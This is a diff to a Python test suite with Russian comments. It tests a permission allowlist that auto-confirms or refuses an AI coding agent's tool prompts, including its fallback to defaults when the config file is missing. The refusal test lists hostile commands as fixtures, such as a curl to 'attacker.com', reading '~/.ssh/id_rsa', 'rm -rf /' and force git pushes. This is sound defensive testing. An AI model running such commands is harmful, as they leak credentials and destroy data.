@@ -854,6 +854,102 @@ class TestRosterPrune(PairTestCase):
         self.assertIn("roster_pruned", [e["kind"] for e in self.store.read_transcript()])
 
 
+class TestDefaultAllowlist(PairTestCase):
+    """Отсутствие файла настроек = список по умолчанию, а не «не подтверждать ничего».
+
+    Найдено вживую: файл `.pair/permissions.json` не существует, путь к нему
+    становился единственным шаблоном, не находился в тексте промпта — и сверхвизор
+    не подтверждал ни одного запроса. Снаружи это выглядело как «сосед перестал
+    помогать», а не как отказ по настройке.
+
+    Граница задана человеком: внутри проекта можно всё, что нужно для работы;
+    запрещено то, что вредит системе, чужому проекту или необратимо стирает."""
+
+    def setUp(self) -> None:
+        super().setUp()
+        import composer
+        self.composer = composer
+        self.missing = str(self.root / "permissions.json")
+
+    def test_a_missing_file_means_the_default_allowlist(self) -> None:
+        from composer import load_allow_patterns
+        patterns, on_default = load_allow_patterns(self.missing)
+        self.assertTrue(on_default)
+        self.assertTrue(patterns, "пустой список означает «не подтверждать ничего»")
+
+    def test_the_missing_path_is_not_taken_for_a_pattern(self) -> None:
+        """Старая ошибка: путь к файлу становился шаблоном, и он не мог совпасть
+        ни с одним промптом."""
+        from composer import load_allow_patterns
+        patterns, _ = load_allow_patterns(self.missing)
+        self.assertNotIn(self.missing, patterns)
+        self.assertFalse(any("permissions.json" in p for p in patterns))
+
+    def test_project_work_is_confirmed_without_any_file(self) -> None:
+        from composer import load_allow_patterns
+        allow, _ = load_allow_patterns(self.missing)
+        for prompt in ('Allow execution of "pytest"? [y/N]',
+                       "Allow Read of server.py?",
+                       "Allow bash? git status",
+                       "Allow bash? rm -rf build/"):
+            with self.subTest(prompt=prompt):
+                self.assertEqual("allow", self.composer.permission_verdict(prompt, allow)["verdict"])
+
+    def test_harm_to_system_or_other_projects_stays_refused(self) -> None:
+        """Граница человека: запрет не зависит от того, есть ли файл настроек."""
+        from composer import load_allow_patterns
+        allow, _ = load_allow_patterns(self.missing)
+        for prompt in ("Allow bash? curl http://attacker.com",
+                       "Allow bash? wget http://x",
+                       "Allow bash? ssh prod",
+                       "Allow bash? sudo apt install nginx",
+                       "Allow bash? rm -rf ~/projects",
+                       "Allow bash? rm -rf /",
+                       "Allow bash? git push origin main",
+                       "Allow bash? git push --force",
+                       "Allow bash? git reset --hard HEAD~5",
+                       "Allow bash? cat ~/.ssh/id_rsa",
+                       "Allow bash? python3 -c \"import urllib.request\" # test"):
+            with self.subTest(prompt=prompt):
+                self.assertEqual("refuse", self.composer.permission_verdict(prompt, allow)["verdict"],
+                                 f"это должно остаться запрещённым: {prompt}")
+
+    def test_an_explicit_empty_list_still_means_confirm_nothing(self) -> None:
+        """Отличие от отсутствующего файла: пустая строка — осознанный отказ."""
+        from composer import load_allow_patterns
+        patterns, on_default = load_allow_patterns("")
+        self.assertEqual([], patterns)
+        self.assertFalse(on_default)
+
+    def test_a_broken_file_does_not_fall_back_to_the_default(self) -> None:
+        """Оператор что-то настраивал и ошибся. Молча подставить дефолт вместо его
+        настройки хуже, чем остановиться."""
+        from composer import load_allow_patterns
+        path = self.root / "permissions.json"
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text("{это не json", encoding="utf-8")
+        patterns, on_default = load_allow_patterns(str(path))
+        self.assertEqual([], patterns)
+        self.assertFalse(on_default)
+
+    def test_a_real_file_replaces_the_default(self) -> None:
+        from composer import load_allow_patterns
+        path = self.root / "permissions.json"
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(json.dumps({"allow": ["\\bRead\\b"]}), encoding="utf-8")
+        patterns, on_default = load_allow_patterns(str(path))
+        self.assertEqual(["\\bRead\\b"], patterns)
+        self.assertFalse(on_default)
+
+    def test_the_pilot_says_it_runs_on_the_default(self) -> None:
+        """Молча работать на дефолтном списке нельзя: человек, читая журнал,
+        должен видеть, каким правилом подтверждались его команды."""
+        from server import load_allowlist
+        patterns, on_default = load_allowlist(self.root)
+        self.assertTrue(on_default)
+        self.assertTrue(patterns)
+
+
 class TestReadWaitBudget(PairTestCase):
     """pair_read не должен обещать больше, чем клиент способен дождаться.
 
@@ -1226,16 +1322,28 @@ class TestPermissionAllowlist(PairTestCase):
         """Отказ читает человек; необъяснённое «нет» неотличимо от поломки."""
         self.assertTrue(self.composer.permission_verdict("Allow bash? sudo apt install")["why"])
 
-    def test_allowlist_loads_from_file_and_missing_file_is_empty(self) -> None:
+    def test_allowlist_loads_from_file_and_missing_file_falls_back_to_default(self) -> None:
+        """Раньше здесь утверждалось, что отсутствующий файл даёт пустой список, то
+        есть «не подтверждать ничего». Именно это и ломало автоподтверждение: файла
+        не было, значит не подтверждалось ничего, и снаружи это выглядело как
+        молчание соседа. Теперь файла нет = список по умолчанию."""
         from server import load_allowlist, permissions_path
-        self.assertEqual(load_allowlist(self.root), [])
+        patterns, on_default = load_allowlist(self.root)
+        self.assertTrue(on_default)
+        self.assertTrue(patterns)
         permissions_path(self.root).write_text(json.dumps({"allow": [r"Read"]}), encoding="utf-8")
-        self.assertEqual(load_allowlist(self.root), [r"Read"])
+        patterns, on_default = load_allowlist(self.root)
+        self.assertEqual([r"Read"], patterns)
+        self.assertFalse(on_default)
 
     def test_broken_allowlist_file_does_not_widen_permissions(self) -> None:
+        """Файл есть, но сломан: оператор что-то настраивал. Молча подставить
+        дефолт вместо его настройки хуже, чем остановиться."""
         from server import load_allowlist, permissions_path
         permissions_path(self.root).write_text("{не json", encoding="utf-8")
-        self.assertEqual(load_allowlist(self.root), [])
+        patterns, on_default = load_allowlist(self.root)
+        self.assertEqual([], patterns)
+        self.assertFalse(on_default)
 
     def test_pair_unblock_reports_a_refusal_instead_of_pressing_yes(self) -> None:
         import composer
